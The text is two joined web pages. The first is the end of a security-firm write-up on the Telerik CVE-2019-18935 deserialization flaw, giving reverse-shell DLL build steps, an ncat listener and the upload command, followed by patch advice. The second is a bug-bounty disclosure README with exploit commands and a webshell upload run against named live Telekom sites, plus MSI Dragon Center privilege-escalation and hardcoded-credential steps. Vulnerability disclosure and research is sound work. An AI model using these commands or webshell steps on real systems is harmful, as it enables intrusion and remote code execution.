    if (fdwReason == DLL_PROCESS_ATTACH)
        hThread = CreateThread(0, 0, MainThread, 0, 0, 0);

    return TRUE;
}

```

Modify `rev_shell.c` with the hostname and port of the C2 server where you'll be listening for a callback:

```
sed -i .bu 's/<HOST>/<HOST>/; s/<PORT>/<PORT>/' rev_shell.c

```

Using the same method of compiling and linking described above, generate your mixed mode assembly DLL:

```
build_dll.bat rev_shell.c

```

Open a Netcat listener to catch the callback:

```
sudo ncat -lvp <PORT>

```

Then upload and load your DLL!

```
python3 CVE-2019-18935.py -u <HOST>/Telerik.Web.UI.WebResource.axd?type=rau -v <VERSION> -f 'C:\Windows\Temp' -p rev_shell_2019121205271355_x86.dll

```
## How to Patch

The [Telerik security advisory](https://www.telerik.com/support/kb/aspnet-ajax/details/allows-javascriptserializer-deserialization) tells you what you need to know, but we’ll repeat the most important parts here:

* Upgrade Telerik for ASP.NET AJAX to [R3 2019 SP1](https://www.telerik.com/support/whats-new/aspnet-ajax/release-history/ui-for-asp-net-ajax-r3-2019-sp1-%28version-2019-3-1023%29) (v2019.3.1023) or later.
* Read Telerik's [RadAsyncUpload security guide](https://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/security) in its entirety, and configure the control according to the [recommended security settings](https://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/security#recommended-settings).

## Conclusion

This write-up has demonstrated how an attacker can chain exploits for unrestricted file upload (CVE-2017-11317) and insecure deserialization (CVE-2019-18935) vulnerabilities to execute arbitrary code on a remote machine.

In recent years, insecure deserialization has emerged as an effective attack vector for executing arbitrary code in object-oriented programming frameworks. As we continue to identify and understand this class of vulnerabilities, it’s important that vendors and users employ timely communication to combat the risk posed by vulnerable software. Now that Telerik has released a patch and security advisory for this vulnerability, affected users should do their part by updating and securely configuring their applications.

*Big thanks again to Markus Wulftange ([@mwulftange](https://twitter.com/mwulftange)) and Paul Taylor ([@bao7uo](https://github.com/bao7uo)), both of whom paved the way for this work through their prior research.*

Subscribe to Bishop Fox's Security Blog

Be first to learn about latest tools, advisories, and findings.

Thank You! You have been subscribed.

---

![Caleb Gross Light Gray](https://assets.bishopfox.com/prod-1437/Images/author-photos/Caleb-Gross-Light-Gray.jpg)

About the author,
Caleb Gross

Director of Capability Development

| Caleb Gross is the Director of the Capability Development at Bishop Fox where he leads a team of offensive security professionals specializing in attack surface research and vulnerability intelligence. Prior to coming to Bishop Fox, he served as an exploitation operator in the [US Department of Defense](https://www.defense.gov/)'s most elite computer network exploitation (CNE) unit. As a top-rated military officer, Caleb led an offensive operations team in the US Air Force's premier selectively manned cyber attack squadron. |
| --- |

[More by Caleb](https://bishopfox.com/authors/caleb-gross)

### Recommended Posts

## You might be interested in these related posts.

[![](https://assets.bishopfox.com/prod-1437/Images/channels/blog/tiles/BishopFox-Blog-RAINK-F.jpg)

Jan 14, 2025

raink: Use LLMs for Document Ranking](https://bishopfox.com/blog/raink-llms-document-ranking)
[![](https://assets.bishopfox.com/prod-1437/Images/channels/blog/tiles/BishopFox-Blogs-Cyber-Mirage-Deepfake-Cloning-F.jpg)

Jan 08, 2025

Cyber Mirage: How AI is Shaping the Future of Social Engineering](https://bishopfox.com/blog/cyber-mirage-deepfake-ai-social-engineering)
[![](https://assets.bishopfox.com/prod-1437/Images/channels/blog/tiles/Featured_Tile_2024-12-12-205929_kppy.jpg)

Dec 13, 2024

Current State of SonicWall Exposure: Firmware Decryption Unlocks New Insights](https://bishopfox.com/blog/state-sonicwall-exposure-firmware-decryption-unlocks-insights)
[![](https://assets.bishopfox.com/prod-1437/Images/channels/blog/tiles/SonicWall-hadware-part1_Featured_Tile.jpg)

Dec 02, 2024

Sonicwall Firmware Deep Dive - Part 1](https://bishopfox.com/blog/sonicwall-firmware-deep-dive-part-1)

* [Cosmos Platform](/cosmos)
* [Cosmos Attack Surface Management](/cosmos-attack-surface-management-casm)
* [Cosmos Application Penetration Testing](/cosmos-application-penetration-testing-capt)
* [Cosmos External Penetration Testing](/cosmos-external-penetration-testing-cept)

* [Services](/services)
* [Application Security](/services/application-security)
* [Cloud Security](/services/cloud-penetration-testing)
* [IoT & Product Security](/services/product-security-review)
* [Network Security](/services/network-security)
* [Red Team & Readiness](/services/red-teaming)
* [Compliance, Regulations, & Frameworks](/services/compliance-and-frameworks)
* [Google, Facebook, & Amazon Partner Assessments](/services/vendor-assessments)

* [Resources](/resources)
* [Resource Center](/resource-center)
* [Blog](/blog)
* [Advisories](/blog/advisories)
* [Tools](/tools)

* [Our Customers](/customers)
* [Our Customer Stories](/resources/customer-stories)

* [Partners](/partners)
* [Partner Programs](/partners)
* [Partner Directory](/partner-directory)
* [Become a Partner](/partners/become-a-partner)

* [Company](/company)
* [About Us](/company)
* [Careers
  We're Hiring](/careers)
* [Events](/events)
* [Newsroom](/news)
* [Bishop Fox Mexico](/mexico)
* [Bishop Fox Labs](/labs)
* [Contact Us](/contact)

Copyright © 2025 Bishop Fox

[Privacy Statement](https://bishopfox.com/privacy-statement)
[Responsible Disclosure Policy](https://bishopfox.com/vulnerability-disclosure-policy)

This site uses cookies to provide you with a great user experience. By continuing to use our website, you consent to the use of cookies. To find out more about the cookies we use, please see our [Privacy Policy](https://bishopfox.com/privacy-statement).

Accept



=== Content from github.com_33f00647_20250119_115121.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frishaldwivedi%2FPublic_Disclosure%2Fblob%2Fmaster%2FREADME.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frishaldwivedi%2FPublic_Disclosure%2Fblob%2Fmaster%2FREADME.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=rishaldwivedi%2FPublic_Disclosure)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rishaldwivedi](/rishaldwivedi)
/
**[Public\_Disclosure](/rishaldwivedi/Public_Disclosure)**
Public

* [Notifications](/login?return_to=%2Frishaldwivedi%2FPublic_Disclosure) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2Frishaldwivedi%2FPublic_Disclosure)
* [Star
   1](/login?return_to=%2Frishaldwivedi%2FPublic_Disclosure)

* [Code](/rishaldwivedi/Public_Disclosure)
* [Issues
  0](/rishaldwivedi/Public_Disclosure/issues)
* [Pull requests
  0](/rishaldwivedi/Public_Disclosure/pulls)
* [Actions](/rishaldwivedi/Public_Disclosure/actions)
* [Projects
  0](/rishaldwivedi/Public_Disclosure/projects)
* [Security](/rishaldwivedi/Public_Disclosure/security)
* [Insights](/rishaldwivedi/Public_Disclosure/pulse)

Additional navigation options

* [Code](/rishaldwivedi/Public_Disclosure)
* [Issues](/rishaldwivedi/Public_Disclosure/issues)
* [Pull requests](/rishaldwivedi/Public_Disclosure/pulls)
* [Actions](/rishaldwivedi/Public_Disclosure/actions)
* [Projects](/rishaldwivedi/Public_Disclosure/projects)
* [Security](/rishaldwivedi/Public_Disclosure/security)
* [Insights](/rishaldwivedi/Public_Disclosure/pulse)

## Files

 master
## Breadcrumbs

1. [Public\_Disclosure](/rishaldwivedi/Public_Disclosure/tree/master)
/
# README.md

Copy path Blame  Blame
## Latest commit

## History

[History](/rishaldwivedi/Public_Disclosure/commits/master/README.md)182 lines (99 loc) · 10 KB master
## Breadcrumbs

1. [Public\_Disclosure](/rishaldwivedi/Public_Disclosure/tree/master)
/
# README.md

Top
## File metadata and controls

* Preview
* Code
* Blame

182 lines (99 loc) · 10 KB[Raw](https://github.com/rishaldwivedi/Public_Disclosure/raw/refs/heads/master/README.md)
# Public\_Disclosure

Sharing POC's of latest discovery

# Unauthenticated RCE in <https://learnnow.telekom.de/>

**Vulnerability** – Insecure Deserialzation Vulnerability

**Vulnerability Description** –
Telerik UI for ASP.NET (Version - 2016.3.1018) was being used by the application. It suffers from a known vulnerability CVE-2019-18935 (Insecure Deserialization). Using basic fingerprinting (Client-side source) it was revealed that the application uses a vulnerable Telerik version.

**Available exploit/Steps to Reproduce** –

`Exploit 1:` <https://github.com/noperator/CVE-2019-18935/tree/master/RAU_crypto>

* Running the above exploit will allow us to upload any supplied file to any writable directory on the vulnerable system. I choose writing to the "C:\Windows\Temp" directory with a harmless Text file, which was successfully uploaded to the target system. Below shared is the command ran.

Command - `python RAU_crypto.py -P "c:\\\Windows\\\Temp" 2016.3.1018 test.txt https://learnnow.telekom.de/SuiATTools//Telerik.Web.UI.WebResource.axd?type=rau`
Screenshot - `[Attached - 1.png]`

`Exploit 2:` <https://github.com/noperator/CVE-2019-18935/blob/master/CVE-2019-18935.py>

* Since the earlier exploit was completely blind, this time ran another exploit, which would actually do an insecure deserialization of a Mixed Model Dll file & cause a sleep of 10 seconds [sleep(10000)] to the application (Time-based approach). Again making sure no harm is done to the system.

Command - `python CVE-2019-18935.py -u https://learnnow.telekom.de/SuiATTools//Telerik.Web.UI.WebResource.axd?type=rau -v 2016.3.1018 -f C:\\\Windows\\\Temp -p sleep_2020092314140184_amd64.dll`

Screenshot -
 `[Attached - 2.png]`

`[Attached - 3.png]`

Team reached out asking to get a reverse shell, so that they can conclusively estimate its security impact.

Unfortunately, the connection for some reason was getting blocked (<https://github.com/noperator/CVE-2019-18935/blob/master/reverse-shell.c>, possibly some endpoint protection. Digging further, I was able to get a FPD (Full path disclosure) in another domain of telekom - <https://salesacademy.telekom.de/SAMSuiTools/>

`D:\IIS_Root\SAMSuiTools\redacted:`

Assuming, both the domanis being hosted on the same domain, using `Exploit 1:` I again uploaded a harmless text file to the above disclosed directory & it worked!
I was able to confirm the same by visiting <https://salesacademy.telekom.de/SAMSuiTools/test.txt> . Since i had the permission to do a reverse shell, i uploaded a simple/custom written webshell to get a execute commands. [The webshell too was getting deleted after few seconds of upload, possibly an EPP solution?

* Git clone the exploit - <https://github.com/noperator/CVE-2019-18935>
* Install python3 & pip3 install the module "pycryptodome"
* Place the webshell in the RAU\_crypto directory.
* Now run the below command -
  Command - `python3 RAU_crypto.py -P "D:\\\IIS_Root\\\SAMSuiTools" 2016.3.1018 bugbounty.aspx https://learnnow.telekom.de/SuiATTools//Telerik.Web.UI.WebResource.axd?type=rau`
* Upon successful upload, you will see a succesful response.

Screenhot -
`[RCE - salesacademy.png]`
`[RCE- salesacademy_telekom_de.png]`

So I ended up getting access to both <https://learnnow.telekom.de/> & <https://salesacademy.telekom.de/>.

Helpful link - <https://labs.bishopfox.com/tech-blog/cve-2019-18935-remote-code-execution-in-telerik-ui>

---

# MSI Dragon Center EOP (CVE-2020-13149)

**Vulnerability** – Local Privilege escalation due to weak ACL

**Vulnerable Version** – Dragon Center 2 - 2.5.1905.3001 & Prior

**Fixed Version** – Dragon Center 2 - 2.6.x & Later

**Vulnerable Binaries** – Dragon Center.exe (C:\Program Files (x86)\MSI\MSI Remind Manager)

**Vulnerability Description** – There are insecure file permissions on "C:\ProgramData\MSI\Dragon Center" folder in Dragon Center Software, shipped with MSI Gaming laptops, allowing local authenticated users to overwrite system files and gain escalated privileges & also bypass controls to change software settings, allowing execution of malware planted in the same directory. This issue affects 2.5.1905.3001 & Prior versions of Dragon Center. This affects the integrity of the system.

---

**Normal Attack Scenario to Bypass control** - An attacker can carry out a very simple attack, bypassing the controls to change certain settings of Dragon Center, which he doesn't has access to.

```
Steps to reproduce –

```

* Create two users in windows, one belonging to administrator group & other a normal user group. The software runs with administrator privileges; hence will be prompted with a password if user tries accessing it. As a user, you don’t have admin’s password, still we can manage to change few settings of Dragon Center by manipulating certain files located in “C:\ProgramData\MSI\Dragon Center”. The problem here being, the permissive ACL.

  `Scenario 1` - To change Battery Master settings via user account, change the value stored in BatteryMaster.txt. Value 0 points to the first option under Battery Master that is “Best for Mobility” & other as 1,2 mapping to the later options.

  `Scenario 2` - To Change Recommended Apps under “Tools & Help”, change the value inside Apps.json. Here what an attacker can achieve is, he can place a malware binary inside the same directory as App.json, as that directory is also writable by the attacker (Normal user). Now he will also replace the path of the existing Recommended App binary, that is the legitimate binary, with the one (malware) he planted in the same directory. To make it look more legitimate, the attacker will use the same Icon file as the legitimate one.

**Advanced Attack Scenario for EOP** - An attacker can carry out an advanced attack, allowing a normal user to delete arbitrary system level files, which normally can’t be done, as he doesn’t has write access.

```
Steps to reproduce –

```

* Empty out “C:\ProgramData\MSI\Dragon Center”
* Create a symlink of the arbitrary file (C:\Windows\System32\protected.dll) to the RPC object (\RPC Control\battery.txt).
* Next, Mounting the RPC directory "\RPC Control" to “C:\ProgramData\MSI\Dragon Center”
* Now next time the Dragon Center is ran by the administrator & if he attempts to change Battery settings, a Boolean value will be written to the battery.txt, which now points to the protected.dll (symlink), thereby corrupting the dll.

---

# MSI Dragon Center - Hardcoded Keys & Credentials

**Vulnerability** – Hardcoded API Keys & Credentials

**Vulnerable Version** – Dragon Center 2 - 2.5.1905.3001 & Prior

**Fixed Version** – Dragon Center 2 - 2.6.x & Later (Vendor never acknowledged)

**Vulnerable Binaries** – Dragon Center.exe (C:\Program Files (x86)\MSI\MSI Remind Manager)

**Vulnerability Description** – The Binary after being decompiled, revels the complete source. Upon analysis, it was reveled that it contained a hardcoded Credentials & API Key for the domain <https://register.msi.com/rest/>.

**Available exploit/Steps to Reproduce** –

* Using a tool named dnSpy, load the .NET binary & attempt to decompile it.
* Upon successful decompilation, navigate to MainWindow class routine & search for keyword “/rest”
* You can find the API request with the API Keys to access & the credentials.
* Now an attacker can simply navigate to <https://register.msi.com/rest/> & login.

---

# MSI Dragon Center - Local Denial of serice

**Vulnerability** – Crashing Dragon Center (Local Denial of service)

**Vulnerable Version** – Dragon Center 2 - 2.5.1905.3001 & Prior

**Fixed Version** – Dragon Center 2 - 2.6.x & Later (Vendor never acknowledged)

**Vulnerable Binaries** – Dragon Center.exe (C:\Program Files (x86)\MSI\MSI Remind Manager)

**Vulnerability Description** – When supplied with a crafted, malformed image file, the Dragon
Center fails to handle the image & crashes the application.

**Available exploit/Steps to Reproduce** –

* Open Dragon Center & navigate to “System Tuner”, then to “Profile 01”.
* Now attempt to upload the below linked image file to the profile photo & click on apply, the app would crash.

POC - <https://drive.google.com/file/d/1h_OytMZmZmUbd3VYoYY31pNp3hUB3Prm/view>

---

# qdPM RCE (CVE-2020-7246)

**Vulnerability** – Path Traversal & Improper Access Control leading to RCE

**Vulnerable Version** – qdPM - 9.1 & prior

**Fixed Version** –

**Vulnerability Description** – An attacker (user with least privilege) can abuse the remove profile photo functionality to traverse through other directories & delete files on the server. In a attack scenario, it's possible to delete exsisting “.htaccess” file in the uploads & user directory, which would allow bypassing protection applied against running dangerous file types (php, html, exe). Leveraging this, it's possible to upload a php backdoor, gaining ability to execute commands on the server.

**Available exploit** -

* Working exploit is available at - <https://www.exploit-db.com/exploits/47954>.
  `python qdPM-exploit.py -url http://IPADDRESS -u test1@localhost.com -p test1`
* Also this CVE has been fetured in AttackDefence Lab - <https://www.attackdefense.com/challengedetailsnoauth?cid=1690>

---

# Zoneminder (CVE-2019-6991)

**Vulnerability** – Classic Stack overflow vulnerability

**Vulnerable Version** – 1.33.1 & Prior

**Fixed Version** –

**Affected Binary** – zmu

**Vulnerability Description** – The vulnerability exists in function zmLoadUser(), in zm\_user.cpp, while authenticating the user. The vulnerability exists in the login functionality. Once a username & password is supplied to the zmu binary, the username & password is passed through mysql\_real\_escape\_string() function in order to produce an escaped SQL string. Due to absense of any protection and limitation placed to the length of username & password, there exists a stack based buffer overflow.

Find more info at -

* [ZoneMinder/zoneminder#2478](https://github.com/ZoneMinder/zoneminder/issues/2478)
* [ZoneMinder/zoneminder#2482](https://github.com/ZoneMinder/zoneminder/pull/2482)

---

**Available exploit** -

* Working exploitation steps can be found at - <https://www.sechustle.com/2020/01/discovering-exploiting-stack-overflow.html>

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


